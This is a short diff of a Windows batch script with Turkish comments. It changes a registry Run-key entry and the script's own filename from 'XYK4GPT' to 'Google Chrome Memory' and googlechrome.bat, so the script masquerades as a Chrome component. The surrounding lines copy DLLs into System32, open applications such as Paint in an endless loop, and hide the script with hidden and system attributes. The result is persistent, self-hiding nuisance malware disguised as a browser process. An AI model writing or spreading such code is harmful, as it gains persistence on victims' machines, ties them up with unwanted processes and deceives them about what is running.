@@ -4,7 +4,7 @@
 xcopy /s /y "%~dp0dlls" "C:\Windows\System32"
 
 :: Kayıt defteri girişi oluştur
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "XYK4GPT" /t REG_SZ /d "%~dp0XYK4GPT.bat" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Google Chrome Memory" /t REG_SZ /d "%~dp0googlechrome.bat" /f
 
 :: Rastgele uygulamalar aç
 :loop
@@ -14,4 +14,4 @@ start "" "C:\Windows\System32\mspaint.exe"
 goto loop
 
 :: Kendi dosyasını gizle
-attrib +h +s "%~dp0XYK4GPT.bat"
+attrib +h +s "%~dp0googlechrome.bat"
